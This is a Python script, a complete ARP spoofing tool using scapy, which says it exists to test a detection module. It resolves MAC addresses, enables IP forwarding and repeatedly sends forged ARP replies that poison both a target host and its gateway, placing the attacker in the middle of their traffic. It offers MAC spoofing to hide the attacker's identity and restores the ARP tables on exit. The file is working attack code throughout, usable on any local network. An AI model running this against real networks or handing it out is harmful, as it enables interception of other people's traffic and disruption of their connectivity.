#!/usr/bin/env python3
"""
ARP Spoofing Attack Script
This script performs an ARP spoofing attack to test Module 4's detection capabilities.
It sends forged ARP packets to a target, pretending to be the gateway.

Usage:
    sudo python3 arp_spoof_attack.py --target <TARGET_IP> --gateway <GATEWAY_IP> --interface <INTERFACE>
    
    If MAC resolution fails, you can provide MACs manually:
    sudo python3 arp_spoof_attack.py --target <TARGET_IP> --gateway <GATEWAY_IP> --target-mac <MAC> --gateway-mac <MAC>
"""

import sys
import time
import argparse
import logging
import os
import subprocess
from scapy.all import ARP, Ether, sendp, getmacbyip, conf

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def enable_ip_forwarding():
    """Enable IP forwarding to prevent DoS"""
    try:
        if sys.platform == "darwin":
            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"], check=True)
        else:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
        logger.info("IP forwarding enabled")
    except Exception as e:
        logger.error(f"Failed to enable IP forwarding: {e}")

def disable_ip_forwarding():
    """Disable IP forwarding"""
    try:
        if sys.platform == "darwin":
            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"], check=True)
        else:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        logger.info("IP forwarding disabled")
    except Exception as e:
        logger.error(f"Failed to disable IP forwarding: {e}")

def get_mac(ip, interface):
    """Get MAC address for an IP"""
    try:
        # First try scapy's built-in function
        mac = getmacbyip(ip)
        if mac:
            return mac
            
        # If that fails, try to ping the target to populate ARP cache
        logger.info(f"Pinging {ip} to populate ARP cache...")
        subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        # Try scapy again
        mac = getmacbyip(ip)
        if mac:
            return mac
            
        # If still fails, try arping (if installed)
        try:
            logger.info(f"Trying arping for {ip}...")
            result = subprocess.run(["arping", "-c", "1", "-I", interface, ip], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if "reply from" in line:
                    # Extract MAC from arping output
                    # Example: Unicast reply from 192.168.1.1 [00:11:22:33:44:55]  0.890ms
                    import re
                    match = re.search(r'\[([0-9a-fA-F:]+)\]', line)
                    if match:
                        return match.group(1)
        except FileNotFoundError:
            pass
            
        return None
    except Exception as e:
        logger.error(f"Error getting MAC for {ip}: {e}")
        return None

def spoof(target_ip, spoof_ip, target_mac, interface, source_mac=None):
    """Send a spoofed ARP packet"""
    # Create ARP packet
    # op=2 is "is-at" (ARP Reply)
    # pdst=target_ip (Who we are fooling)
    # hwdst=target_mac (MAC of who we are fooling)
    # psrc=spoof_ip (Who we are pretending to be)
    
    if source_mac:
        # If source_mac is provided, we spoof the Ethernet source AND ARP hardware source
        packet = Ether(dst=target_mac, src=source_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=source_mac)
    else:
        # Otherwise use interface MAC (default)
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # Send packet
    sendp(packet, iface=interface, verbose=False)

def restore(dest_ip, source_ip, dest_mac, source_mac, interface):
    """Restore ARP table to normal"""
    packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(packet, iface=interface, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description='ARP Spoofing Attack Tool')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--gateway', required=True, help='Gateway IP address')
    parser.add_argument('--interface', default='wlan0', help='Network interface (default: wlan0)')
    parser.add_argument('--count', type=int, default=1000, help='Number of packets to send')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between packets')
    parser.add_argument('--target-mac', help='Manually specify target MAC')
    parser.add_argument('--gateway-mac', help='Manually specify gateway MAC')
    parser.add_argument('--spoof-mac', help='Spoof the source MAC address (randomize attacker identity)', default=None)
    
    args = parser.parse_args()
    
    # Validate root
    if os.geteuid() != 0:
        logger.error("This script requires root privileges. Please run with sudo.")
        sys.exit(1)
        
    logger.info(f"Starting ARP Spoofing Attack on {args.interface}")
    logger.info(f"Target: {args.target}")
    logger.info(f"Gateway: {args.gateway}")
    
    try:
        # Get MAC addresses
        target_mac = args.target_mac
        gateway_mac = args.gateway_mac
        
        if not target_mac:
            logger.info("Resolving Target MAC...")
            target_mac = get_mac(args.target, args.interface)
            
        if not gateway_mac:
            logger.info("Resolving Gateway MAC...")
            gateway_mac = get_mac(args.gateway, args.interface)
        
        if not target_mac:
            logger.error(f"Could not find MAC address for target {args.target}")
            logger.info("Try specifying it manually with --target-mac <MAC>")
            sys.exit(1)
            
        if not gateway_mac:
            logger.error(f"Could not find MAC address for gateway {args.gateway}")
            logger.info("Try specifying it manually with --gateway-mac <MAC>")
            sys.exit(1)
            
        logger.info(f"Target MAC: {target_mac}")
        logger.info(f"Gateway MAC: {gateway_mac}")
        
        enable_ip_forwarding()
        
        logger.info(f"Starting spoofing loop ({args.count} packets)... Press Ctrl+C to stop.")
        
        sent_packets = 0
        try:
            while sent_packets < args.count:
                # Spoof target (tell target that we are the gateway)
                spoof(args.target, args.gateway, target_mac, args.interface, args.spoof_mac)
                
                # Spoof gateway (tell gateway that we are the target)
                spoof(args.gateway, args.target, gateway_mac, args.interface, args.spoof_mac)
                
                sent_packets += 2
                print(f"\r[+] Packets sent: {sent_packets}", end="")
                time.sleep(args.delay)
                
        except KeyboardInterrupt:
            print("\n[!] Detected Ctrl+C. Stopping attack...")
            
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        
    finally:
        logger.info("Restoring ARP tables...")
        if 'target_mac' in locals() and 'gateway_mac' in locals() and target_mac and gateway_mac:
            restore(args.target, args.gateway, target_mac, gateway_mac, args.interface)
            restore(args.gateway, args.target, gateway_mac, target_mac, args.interface)
            
        disable_ip_forwarding()
        logger.info("Attack finished.")

if __name__ == "__main__":
    main()
